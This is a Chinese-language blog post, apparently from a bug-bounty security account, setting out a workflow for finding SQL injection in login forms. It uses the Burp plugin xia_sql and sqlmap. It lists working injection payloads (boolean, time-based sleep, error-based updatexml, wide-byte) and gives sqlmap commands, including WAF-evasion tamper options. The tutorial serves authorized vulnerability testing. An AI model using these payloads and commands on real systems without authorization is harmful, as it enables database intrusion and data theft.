#  SQL注入漏洞测试优化流程（1.1）  
原创 游山玩水
                    游山玩水  山水SRC   2026-03-08 02:10  
  
## 概述  
  
本文将原来SQL注入的测试流程与内容进行优化（xia_sql插件+sqlmap）  
  
原来测试流程：[登录框漏洞checklist（一）](https://mp.weixin.qq.com/s?__biz=MzY4MTEwNDczMA==&mid=2247483748&idx=1&sn=5c4e09cc2e58fe70ab17f10e8bb13720&scene=21#wechat_redirect)  
  
  
优化内容：  
  
①xia_sql的payload  
  
②如何选择  
xia_sql中  
可能存在SQL注入的数据包  
  
③使用sqlmap的语句  
## xia_sql使用流程  
  
测试方法：  
  
使用bp插件：xia SQL（该插件会对数据包的每一个参数进行注入并和原来注入前响应包的长度进行对比）  
  
地址：  
https://github.com/smxiazi/xia_sql  
  
测试步骤：  
  
①打开  
xia SQL的监控（底下的payload可以用自带的也可以问AI让他写一些，如果该工具实在不会用就去哔站搜视频）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8tDOXFoCoQibRjBWVhsmcaEmWicAicnGc66uVyq1yqjiaMKLicibtZBGShBvD8Dyk7ppfy8Q5lW4ew8Ue0wb5h23Dku2p6iaJcJf8MYaWrC5dWRVrg/640?wx_fmt=png&from=appmsg "")  
  
优化内容：payload内容进行了优化（能比较全面效率的测试）  
  
'  
  
"  
  
')  
  
"))  
  
-1  
  
-0  
  
%df'  
  
'%20and%20'1'='1  
  
'%20and%20'1'='2  
  
%df'%20and%20sleep(3)#  
  
'%20and%20sleep(3)--%20-  
  
')%20and%20sleep(3)--%20-  
  
'%20and%20updatexml(1,concat(0x7e,@@version),1)%20and%20'1'='1  
  
'%20order%20by%2010--%20-  
  
②在登录框位置输入任意值提交表单（点击登录）就行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8tDOXFoCoQ84v7We1YWKIIrLg1icXEJM8JsWw9ru9Xaz4R344LrUbssTBNcC5xgAxHtoKa44KbHpiaf57V6VNnV9nVPBWJSWRQGU2nalH31g4/640?wx_fmt=png&from=appmsg "")  
  
寻找有对钩的数据包（这代表注入后响应包长度有变，这种可能存在sql注入）  
  
具体哪些需要进一步使用sqlmap测试  
  
①响应包长度变化很大的  
  
②响应时间变化很大的  
  
优化内容：选择哪些数据包测试SQL注入  
  
xia_sql注意变化列的内容  
  
 Err ：响应中包含数据库报错关键字。这是最高置信度的注入迹象，应最优先处理。  
  
  
✔️  
 ==> ? ：原始包长度与两个单引号长度相同，且与一个单引号长度不同。插件认为“很可能是注入”。  
  
  
**如何根据长度变化选择可能存在SQL注入：**  
将payload后长度变化大于4的数据包发送到repeater模块和comparer模块，repeater模块删除payload后发送comparer对比（响应包），根据原响应包和payload后响应包的不同来人工分析是否存在SQL注入  
  
  
## sqlmap使用语句  
  
将xia_sql最终筛选出的数据包保存成txt文件使用下面语句跑  
  
**sqlmap命令**  
  
****  
**先用不带waf绕过命令跑**  
  
python sqlmap.py -r bp.txt -p “[参数名]” --technique=BEUST --level=3 --risk=2 --batch --random-agent --threads=5  
  
**有waf**  
  
python sqlmap.py -r bp.txt -p “[已确认的参数名]” --technique=BEUST --level=3 --risk=2 --batch --random-agent --tamper=space2comment,charencode --delay=2 --threads=3  
  
  
